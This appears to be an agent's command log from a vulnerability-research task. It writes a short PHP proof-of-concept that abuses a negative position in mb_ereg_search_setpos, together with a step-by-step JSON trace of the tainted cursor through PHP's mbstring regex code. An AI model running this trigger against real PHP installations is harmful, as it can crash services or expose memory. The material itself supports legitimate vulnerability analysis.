message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_regex_encoding('iso-8859-1');
mb_ereg_search_init('Itrntinliztin');
mb_ereg_search_setpos(-5);
mb_ereg_search_pos('ntin');
mb_ereg_search_regs('ov');
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"MBREX(search_str)","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker-controlled subject string is stored in the global mbregex search state."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_setpos)","line":1646,"var":"position","code":"if ((position < 0) && (!Z_ISUNDEF(MBREX(search_str))) && (Z_TYPE(MBREX(search_str)) == IS_STRING)) { position += Z_STRLEN(MBREX(search_str)); }","note":"A negative position is adjusted using the stored subject length, allowing attacker-controlled cursor placement."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_setpos)","line":1653,"var":"MBREX(search_pos)","code":"MBREX(search_pos) = position;","note":"The global search cursor is updated to the computed offset for subsequent search calls."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1438,"var":"MBREX(search_pos)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"Search execution uses the attacker-controlled cursor and the persistent regex/search buffers."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_re)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"The result accessor reuses the same global regex object and can reach the named-group iteration sink after the stateful search."}
]
EOF
php -l poc.php 2>/dev/null || true
cat poc.php && echo '---TRACE---' && cat candidate_trace.json

